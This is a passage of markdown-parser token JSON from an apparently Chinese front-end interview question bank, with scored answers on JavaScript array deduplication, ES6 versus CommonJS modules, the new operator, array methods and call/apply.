方法二：使用循环和一个新数组","task":false,"loose":false,"text":"**1：** 方法二：使用循环和一个新数组","tokens":[{"type":"text","raw":"**1：** 方法二：使用循环和一个新数组","text":"**1：** 方法二：使用循环和一个新数组","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 方法二：使用循环和一个新数组","text":" 方法二：使用循环和一个新数组","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction uniqueArray(arr) {\\n    let newArray = [];\\n    for (let i = 0; i < arr.length; i++) {\\n        if (!newArray.includes(arr[i])) {\\n            newArray.push(arr[i]);\\n        }\\n    }\\n    return newArray;\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\n    console.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n```","lang":"js","text":"function uniqueArray(arr) {\\n    let newArray = [];\\n    for (let i = 0; i < arr.length; i++) {\\n        if (!newArray.includes(arr[i])) {\\n            newArray.push(arr[i]);\\n        }\\n    }\\n    return newArray;\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\n    console.log(uniqueArray(array)); // 输出[1, 2, 3, 4]"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 方法三：使用filter方法和indexOf函数","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 方法三：使用filter方法和indexOf函数","task":false,"loose":false,"text":"**2：** 方法三：使用filter方法和indexOf函数","tokens":[{"type":"text","raw":"**2：** 方法三：使用filter方法和indexOf函数","text":"**2：** 方法三：使用filter方法和indexOf函数","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 方法三：使用filter方法和indexOf函数","text":" 方法三：使用filter方法和indexOf函数","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：filter方法用于过滤数组中的元素，indexOf函数用于查找元素在数组中的首次出现位置。通过filter方法遍历数组，只保留首次出现的元素，从而实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.filter((element, index, self) => {\\n    return self.indexOf(element) === index;\\n});\\nconsole.log(uniqueArray);\\n//解释：filter方法的回调函数接收三个参数：element（当前元素）、index（当前元素的索引）和self（数组本身）。在回调函数中，self.indexOf(element)会查找element在数组中的首次出现位置。如果这个位置等于当前元素的索引index，说明这个元素是首次出现的，filter方法会保留这个元素；否则，就过滤掉这个元素。最终filter方法返回一个新的去重后的数组。\\n```","lang":"js","text":"//原理：filter方法用于过滤数组中的元素，indexOf函数用于查找元素在数组中的首次出现位置。通过filter方法遍历数组，只保留首次出现的元素，从而实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.filter((element, index, self) => {\\n    return self.indexOf(element) === index;\\n});\\nconsole.log(uniqueArray);\\n//解释：filter方法的回调函数接收三个参数：element（当前元素）、index（当前元素的索引）和self（数组本身）。在回调函数中，self.indexOf(element)会查找element在数组中的首次出现位置。如果这个位置等于当前元素的索引index，说明这个元素是首次出现的，filter方法会保留这个元素；否则，就过滤掉这个元素。最终filter方法返回一个新的去重后的数组。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 方法四：使用reduce方法","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 方法四：使用reduce方法","task":false,"loose":false,"text":"**2：** 方法四：使用reduce方法","tokens":[{"type":"text","raw":"**2：** 方法四：使用reduce方法","text":"**2：** 方法四：使用reduce方法","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 方法四：使用reduce方法","text":" 方法四：使用reduce方法","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：reduce方法用于对数组中的每个元素执行一个由您提供的reducer函数（升序执行），将其结果汇总为单个返回值。可以利用reduce方法来构建一个新的去重数组。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.reduce((acc, cur) => {\\n    if (!acc.includes(cur)) {\\n        acc.push(cur);\\n    }\\n    return acc;\\n}, []);\\nconsole.log(uniqueArray);\\n//解释：reduce方法的第一个参数是一个reducer函数，它接收两个参数：acc（累加器，初始值是一个空数组[]）和cur（当前元素）。在reducer函数中，如果acc数组不包含cur元素（acc.includes(cur)返回false），就将cur添加到acc中。最后，reduce方法返回acc，即去重后的数组。\\n```","lang":"js","text":"//原理：reduce方法用于对数组中的每个元素执行一个由您提供的reducer函数（升序执行），将其结果汇总为单个返回值。可以利用reduce方法来构建一个新的去重数组。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.reduce((acc, cur) => {\\n    if (!acc.includes(cur)) {\\n        acc.push(cur);\\n    }\\n    return acc;\\n}, []);\\nconsole.log(uniqueArray);\\n//解释：reduce方法的第一个参数是一个reducer函数，它接收两个参数：acc（累加器，初始值是一个空数组[]）和cur（当前元素）。在reducer函数中，如果acc数组不包含cur元素（acc.includes(cur)返回false），就将cur添加到acc中。最后，reduce方法返回acc，即去重后的数组。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 方法五：使用Object对象（以元素为键）","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 方法五：使用Object对象（以元素为键）","task":false,"loose":false,"text":"**2：** 方法五：使用Object对象（以元素为键）","tokens":[{"type":"text","raw":"**2：** 方法五：使用Object对象（以元素为键）","text":"**2：** 方法五：使用Object对象（以元素为键）","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 方法五：使用Object对象（以元素为键）","text":" 方法五：使用Object对象（以元素为键）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n//原理：利用Object的键的唯一性，将数组元素作为对象的键，值可以任意设置（这里设置为true），然后获取对象的键并转换回数组来实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = [];\\nlet tempObj = {};\\nfor (let i = 0; i < array.length; i++) {\\n    let current = array[i];\\n    if (!tempObj[current]) {\\n        uniqueArray.push(current);\\n        tempObj[current] = true;\\n    }\\n}\\nconsole.log(uniqueArray);\\n//解释：首先创建一个空数组uniqueArray用于存储去重后的元素，以及一个空对象tempObj。然后遍历array数组，对于每个元素current，检查tempObj对象中是否已经存在以current为键的属性（tempObj[current]是否为true）。如果不存在，就将current添加到uniqueArray中，并在tempObj中添加一个以current为键，值为true的属性。这样，利用对象键的唯一性实现了数组去重。最后返回uniqueArray。\\n```","lang":"js","text":"//原理：利用Object的键的唯一性，将数组元素作为对象的键，值可以任意设置（这里设置为true），然后获取对象的键并转换回数组来实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = [];\\nlet tempObj = {};\\nfor (let i = 0; i < array.length; i++) {\\n    let current = array[i];\\n    if (!tempObj[current]) {\\n        uniqueArray.push(current);\\n        tempObj[current] = true;\\n    }\\n}\\nconsole.log(uniqueArray);\\n//解释：首先创建一个空数组uniqueArray用于存储去重后的元素，以及一个空对象tempObj。然后遍历array数组，对于每个元素current，检查tempObj对象中是否已经存在以current为键的属性（tempObj[current]是否为true）。如果不存在，就将current添加到uniqueArray中，并在tempObj中添加一个以current为键，值为true的属性。这样，利用对象键的唯一性实现了数组去重。最后返回uniqueArray。"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## ES6 和 CommonJS 的区别\\n\\n","depth":2,"text":"ES6 和 CommonJS 的区别","tokens":[{"type":"text","raw":"ES6 和 CommonJS 的区别","text":"ES6 和 CommonJS 的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const\\n- **2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const\\n","task":false,"loose":false,"text":"**2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","tokens":[{"type":"text","raw":"**2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","text":"**2：** CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","text":" CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const","escaped":false}]}]},{"type":"list_item","raw":"- **2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","task":false,"loose":false,"text":"**2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","tokens":[{"type":"text","raw":"**2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","text":"**2：** import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","text":" import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：S6 Module和CommonJS模块的共同点：","text":"注：S6 Module和CommonJS模块的共同点：","tokens":[{"type":"text","raw":"注：S6 Module和CommonJS模块的共同点：","text":"注：S6 Module和CommonJS模块的共同点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","text":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","tokens":[{"type":"text","raw":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","text":"CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[docs](https://juejin.cn/post/7331931937357496354)","text":"[docs](https://juejin.cn/post/7331931937357496354)","tokens":[{"type":"link","raw":"[docs](https://juejin.cn/post/7331931937357496354)","href":"https://juejin.cn/post/7331931937357496354","title":null,"text":"docs","tokens":[{"type":"text","raw":"docs","text":"docs","escaped":false}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## new 操作符的实现原理\\n\\n","depth":2,"text":"new 操作符的实现原理","tokens":[{"type":"text","raw":"new 操作符的实现原理","text":"new 操作符的实现原理","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** new操作符的执行过程：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** new操作符的执行过程：","task":false,"loose":false,"text":"**2：** new操作符的执行过程：","tokens":[{"type":"text","raw":"**2：** new操作符的执行过程：","text":"**2：** new操作符的执行过程：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" new操作符的执行过程：","text":" new操作符的执行过程：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":">（1）首先创建了一个新的空对象\\n>\\n>（2）设置原型，将对象的原型设置为函数的 prototype 对象\\n>\\n>（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）\\n>\\n>（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","tokens":[{"type":"paragraph","raw":"（1）首先创建了一个新的空对象","text":"（1）首先创建了一个新的空对象","tokens":[{"type":"text","raw":"（1）首先创建了一个新的空对象","text":"（1）首先创建了一个新的空对象","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","text":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","tokens":[{"type":"text","raw":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","text":"（2）设置原型，将对象的原型设置为函数的 prototype 对象","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","text":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","tokens":[{"type":"text","raw":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","text":"（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","text":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","tokens":[{"type":"text","raw":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","text":"（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象","escaped":false}]}],"text":"（1）首先创建了一个新的空对象\\n\\n（2）设置原型，将对象的原型设置为函数的 prototype 对象\\n\\n（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）\\n\\n（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象"},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction objectFactory() {\\n  let newObject = null;\\n  let constructor = Array.prototype.shift.call(arguments);\\n  let result = null;\\n  // 判断参数是否是一个函数\\n  if (typeof constructor !== \\"function\\") {\\n    console.error(\\"type error\\");\\n    return;\\n  }\\n  // 新建一个空对象，对象的原型为构造函数的 prototype 对象\\n  newObject = Object.create(constructor.prototype);\\n  // 将 this 指向新建对象，并执行函数\\n  result = constructor.apply(newObject, arguments);\\n  // 判断返回对象\\n  let flag = result && (typeof result === \\"object\\" || typeof result === \\"function\\");\\n  // 判断返回结果\\n  return flag ? result : newObject;\\n}\\n// 使用方法\\nobjectFactory(构造函数, 初始化参数);\\n```","lang":"js","text":"function objectFactory() {\\n  let newObject = null;\\n  let constructor = Array.prototype.shift.call(arguments);\\n  let result = null;\\n  // 判断参数是否是一个函数\\n  if (typeof constructor !== \\"function\\") {\\n    console.error(\\"type error\\");\\n    return;\\n  }\\n  // 新建一个空对象，对象的原型为构造函数的 prototype 对象\\n  newObject = Object.create(constructor.prototype);\\n  // 将 this 指向新建对象，并执行函数\\n  result = constructor.apply(newObject, arguments);\\n  // 判断返回对象\\n  let flag = result && (typeof result === \\"object\\" || typeof result === \\"function\\");\\n  // 判断返回结果\\n  return flag ? result : newObject;\\n}\\n// 使用方法\\nobjectFactory(构造函数, 初始化参数);"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 数组的原生方法有哪些？\\n\\n","depth":2,"text":"数组的原生方法有哪些？","tokens":[{"type":"text","raw":"数组的原生方法有哪些？","text":"数组的原生方法有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n- **1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n- **1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n- **1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n- **1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n- **1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n- **1：** 数组归并方法 reduce() 和 reduceRight() 方法","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n","task":false,"loose":false,"text":"**1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","tokens":[{"type":"text","raw":"**1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","text":"**1：** 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","text":" 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n","task":false,"loose":false,"text":"**1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","tokens":[{"type":"text","raw":"**1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","text":"**1：** 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","text":" 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n","task":false,"loose":false,"text":"**1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","tokens":[{"type":"text","raw":"**1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","text":"**1：** 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","text":" 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n","task":false,"loose":false,"text":"**1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","tokens":[{"type":"text","raw":"**1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","text":"**1：** 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","text":" 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n","task":false,"loose":false,"text":"**1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","tokens":[{"type":"text","raw":"**1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","text":"**1：** 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","text":" 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n","task":false,"loose":false,"text":"**1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","tokens":[{"type":"text","raw":"**1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","text":"**1：** 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","text":" 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 数组归并方法 reduce() 和 reduceRight() 方法","task":false,"loose":false,"text":"**1：** 数组归并方法 reduce() 和 reduceRight() 方法","tokens":[{"type":"text","raw":"**1：** 数组归并方法 reduce() 和 reduceRight() 方法","text":"**1：** 数组归并方法 reduce() 和 reduceRight() 方法","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 数组归并方法 reduce() 和 reduceRight() 方法","text":" 数组归并方法 reduce() 和 reduceRight() 方法","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## bind、call、apply 区别\\n\\n","depth":2,"text":"bind、call、apply 区别","tokens":[{"type":"text","raw":"bind、call、apply 区别","text":"bind、call、apply 区别","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同\\n- **1：** 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同\\n","task":false,"loose":false,"text":"**1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","tokens":[{"type":"text","raw":"**1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","text":"**1：** call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" call 和apply 